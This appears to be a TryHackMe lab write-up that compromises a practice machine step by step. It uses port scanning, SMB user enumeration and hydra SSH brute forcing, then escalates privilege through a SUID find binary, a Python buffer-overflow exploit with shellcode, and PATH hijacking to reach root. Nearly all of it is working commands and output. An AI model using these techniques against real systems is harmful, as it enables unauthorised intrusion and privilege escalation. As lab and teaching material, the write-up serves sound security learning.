# Port Scanning
```bash
❯ rustscan -a 10.49.142.53 -- -A

Open 10.49.142.53:22
Open 10.49.142.53:139
Open 10.49.142.53:445

PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3OBXYJUrPGglNoKPhUcwp3YiZRy6qNTHdOmGsgzy5ll+GDY8zkoIsNiqdHSaDKXvO+9ix+dZNF9CtgRDrLhL6j2Bn4RI011xveUiTF6LO7PEsv5RYI7KueOXyaw8vahdf/CdV4RQXhefge6FIZqkvhDGQsid8F3e846kJ7FPZYAcwQ5Iapv9ae1+23OZcDLtdTDlQOZIyNaVmPu0XVjHYnvHsC5r/eX/wq9WzETDVzgANMwsWOeZmjH956z4hjL7K91KHeaMnRHeO/tln1Pk9EG1eGn4FHsD1/LdumWp0pHDUXwTJ7OwuuucnzuiLrx8jDr03bEu4kPKpkB0Bc1Kb
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlazDOaT1mvebWCf/KbUSzgt3MCueCjEYz6Uf6tDyYG5H7HsVTbKbphLPJupB3gght1wmk+8BpQe8q4fa+1ZXQ=
|   256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdOXbBN4ecgx8K412W8m2fd7R6y7c0O9uXXFv+gLusY
139/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```
### SMB enumeration 
```bash
❯ enum4linux 10.49.142.53 

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''


S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
```
I bruteforced ssh for user tryhackme.
```bash
❯ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt 10.49.142.53 ssh -f -t 48

[22][ssh] host: 10.49.142.53   login: tryhackme   password: thebest
```
Logged in via `tryhackme:thebest`.
### Tryhackme to des 
Find the SUID binary and explit it.
```bash
tryhackme@THM_exploit:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/home/des/bof
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/find
/usr/bin/chsh
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping
tryhackme@THM_exploit:~$ /usr/bin/find . -exec /bin/bash -p \; -quit
bash-4.4$ cd ../des
bash-4.4$ ls -la
total 52
drwx------ 4 des  des  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root 1740 Jan 12  2020 .bash_history
-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 des  des  3771 Apr  4  2018 .bashrc
-rwsr-xr-x 1 kel  kel  8600 Jan 17  2020 bof
-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
drwx------ 2 des  des  4096 Jan 12  2020 .cache
-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
drwx------ 3 des  des  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile
bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{...}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
```
There is binary `bof`. Extract buffer over flow via following script. and get the shell.
```python3
#!/usr/bin/env python3

import struct
import os

# Shellcode from hint
shellcode = (
    b"\x50"                     # push rax
    b"\x48\x31\xd2"             # xor rdx, rdx
    b"\x48\x31\xf6"             # xor rsi, rsi
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rbx, '/bin//sh'
    b"\x53"                     # push rbx
    b"\x54"                     # push rsp
    b"\x5f"                     # pop rdi
    b"\xb0\x3b"                 # mov al, 0x3b
    b"\x0f\x05"                 # syscall
)

# Offset from our debugging
OFFSET = 616  # 608 buffer + 8 RBP

# From GDB: buffer starts at 0x7fffffffe250
# We'll use an address in the middle of our NOP sled
# Buffer start: 0x7fffffffe250
# Add 100 bytes into NOP sled for safety
RETURN_ADDR = 0x7fffffffe2b0  # 0x7fffffffe250 + 100

# Or use rsp - some offset based on your GDB output
# rsp was 0x7fffffffe498, so buffer is at 0x7fffffffe250
# Use address in the middle of NOP sled

# Build payload
NOP_COUNT = 200
SHELLCODE_LEN = len(shellcode)
JUNK_COUNT = OFFSET - NOP_COUNT - SHELLCODE_LEN

payload = b"\x90" * NOP_COUNT
payload += shellcode
payload += b"A" * JUNK_COUNT
payload += struct.pack("<Q", RETURN_ADDR)

# Write to file
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"[*] Payload size: {len(payload)} bytes")
print(f"[*] NOP sled: {NOP_COUNT} bytes")
print(f"[*] Shellcode: {SHELLCODE_LEN} bytes")
print(f"[*] Junk: {JUNK_COUNT} bytes")
print(f"[*] Return address: 0x{ RETURN_ADDR:016x}")
print("[*] Running exploit...")
print("[*] Type 'cat /home/kel/flag.txt' if you get a shell")

# Execute
os.system(f"(cat payload.bin; cat) | /home/des/bof")
```
```bash
des@THM_exploit:~$ python3 ex.py 
[*] Payload size: 624 bytes
[*] NOP sled: 200 bytes
[*] Shellcode: 24 bytes
[*] Junk: 392 bytes
[*] Return address: 0x00007fffffffe2b0
[*] Running exploit...
[*] Type 'cat /home/kel/flag.txt' if you get a shell
Enter some string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC: File name too long
ld
ld: no input files
ls
ls: cannot open directory '.': Permission denied
cat /home/kel/flag.txt
You flag is THM{...}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```
### kel to ROOT 
```bash
kel@THM_exploit:~$ ls -la
total 52
drwx------ 4 kel  kel  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root   16 Jan 12  2020 .bash_history
-rw-r--r-- 1 kel  kel   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kel  kel  3771 Apr  4  2018 .bashrc
drwx------ 2 kel  kel  4096 Jan 12  2020 .cache
-rwsr-xr-x 1 root root 8392 Jan 17  2020 exe
-rw-r--r-- 1 root root   76 Jan 17  2020 exe.c
-rw------- 1 kel  kel   118 Jan 17  2020 flag.txt
drwx------ 3 kel  kel  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 kel  kel   807 Apr  4  2018 .profile
kel@THM_exploit:~$ cat exe.c
#include <unistd.h>

void main()
{
	setuid(0);
	setgid(0);
	system("ps");
}
kel@THM_exploit:~$ echo '/bin/bash -p' > /tmp/ps
kel@THM_exploit:~$ chmod +x /tmp/ps
kel@THM_exploit:~$ export PATH=/tmp:$PATH
kel@THM_exploit:~$ ./exe
root@THM_exploit:~# cd /root
root@THM_exploit:/root# ls -la
total 36
drwx------  4 root root 4096 Jan 17  2020 .
drwxr-xr-x 26 root root 4096 Jan 12  2020 ..
-rw-------  1 root root 7562 Jan 17  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jan 12  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  128 Jan 17  2020 root.txt
drwx------  2 root root 4096 Jan 12  2020 .ssh
root@THM_exploit:/root# cat root.txt
The flag: THM{...}. 
Also, thank you for your participation.

The room is built with love. DesKel out.

```